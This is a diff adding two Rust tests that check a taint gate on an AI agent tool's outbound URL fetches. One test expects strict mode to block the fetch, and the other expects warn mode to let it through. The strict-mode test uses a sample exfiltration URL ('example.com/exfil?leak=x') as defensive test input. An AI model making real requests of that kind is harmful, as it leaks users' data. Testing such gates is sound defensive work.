@@ -2110,4 +2110,59 @@ mod tests {
         assert!(!off_again.tainted_strict);
         let _ = std::fs::remove_dir_all(&tmp);
     }
+
+    // ── DREAD #1 Slice C — http.outbound gate dispatch tests ───────────
+
+    #[tokio::test]
+    async fn dispatch_fetch_url_strict_mode_rejects_without_network() {
+        // Strict mode: gate rejects before fetch_url is ever called.
+        // No network is touched — proves the gate fires upstream of the
+        // actual outbound request.
+        let tmp = std::env::temp_dir().join(format!("vibe_fetch_strict_{}", std::process::id()));
+        std::fs::create_dir_all(&tmp).unwrap();
+        let executor = ToolExecutor::new(tmp.clone(), false).with_tainted_strict(true);
+
+        let result = executor
+            .dispatch_fetch_url_tool_call("https://example.com/exfil?leak=x")
+            .await;
+        assert!(!result.success, "strict mode must reject");
+        assert!(
+            result.output.contains("rejected by tainted gate"),
+            "got: {}",
+            result.output,
+        );
+        // The URL bytes must not have been forwarded — no fetch attempt
+        // implies the test passes even on hosts with no network.
+        assert!(
+            !result.output.contains("Could not connect"),
+            "gate let the call through: {}",
+            result.output,
+        );
+
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[tokio::test]
+    async fn dispatch_fetch_url_warn_mode_calls_fetch_url() {
+        // Warn mode: the gate logs but executes. We don't have a real
+        // server, so the actual fetch will error — but the error must be
+        // a network/HTTP error, NOT the gate rejection. That distinction
+        // proves the warn-mode pass-through worked.
+        let tmp = std::env::temp_dir().join(format!("vibe_fetch_warn_{}", std::process::id()));
+        std::fs::create_dir_all(&tmp).unwrap();
+        let executor = ToolExecutor::new(tmp.clone(), false);
+        assert!(!executor.tainted_strict);
+
+        let result = executor
+            .dispatch_fetch_url_tool_call("http://127.0.0.1:1/never-listens")
+            .await;
+        // The gate must NOT be the rejection source in warn mode.
+        assert!(
+            !result.output.contains("rejected by tainted gate"),
+            "warn-mode wrongly rejected at gate: {}",
+            result.output,
+        );
+
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
 }
